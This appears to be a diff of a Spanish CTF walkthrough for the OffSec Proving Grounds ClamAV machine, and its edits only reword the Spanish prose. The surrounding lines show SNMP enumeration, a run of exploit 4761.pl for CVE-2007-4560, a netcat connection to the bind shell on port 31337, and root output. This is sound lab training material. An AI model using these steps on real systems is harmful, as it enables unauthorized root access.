@@ -8,9 +8,9 @@ tags: ["CTF","Offsec","Linux", "Easy"]
 skills: ["SNMP Enum","CVE-2007-4560"]
 ---
 
-En este tutorial, demuestro cómo obtuve acceso completo al sistema ClamAV de OffSec Proving Grounds.
+En este tutorial, muestro cómo obtuve acceso completo al sistema ClamAV de OffSec Proving Grounds.
 
-## Espacio de Aprendizaje
+## Objetivos de Aprendizaje
 
 - Enumeración SNMP
 - Sendmail + ClamAV Milter 0.91.2 (CVE-2007-4560)
@@ -127,7 +127,7 @@ Nada interesante por el momento.
 
 ![alt text](img/http.png)
 
-Convirtiendo el binario de vuelta a texto se revela el mensaje: `ifyoudontpwnmeuran0b`. Intento enumerar más el servicio web, pero lo abandono por ahora.
+Al convertir el binario de nuevo a texto, se revela el mensaje: `ifyoudontpwnmeuran0b`. Intenté enumerar más el servicio web, pero lo dejé por el momento.
 
 ### SNMP (161/UDP)
 
@@ -171,7 +171,7 @@ snmp-check 192.168.69.42
  
 ```
 
-Después de leer y entender el exploit, ejecutamos el exploit.
+Después de leer y entender el exploit, lo ejecutamos.
 
 ```bash
 perl 4761.pl 192.168.69.42
@@ -198,7 +198,7 @@ Attacking 192.168.69.42...
 221 2.0.0 localhost.localdomain closing connection
 ```
 
-Luego, deberíamos poder conectarnos a la máquina (El exploit abre un puerto para que nos conectemos - *Bind Shell*)
+Luego, deberíamos poder conectarnos a la máquina, ya que el exploit abre un puerto para que nos conectemos.
 
 ```bash
 nc -nv 192.168.69.42 31337
@@ -232,7 +232,7 @@ UID=0(ROOT) GID=0(ROOT) GROUPS=0(ROOT)
 
 ## Post-Explotación
 
-**Ya soy root**
+**Ya tenemos acceso root**
 
 ## Pruebas
 
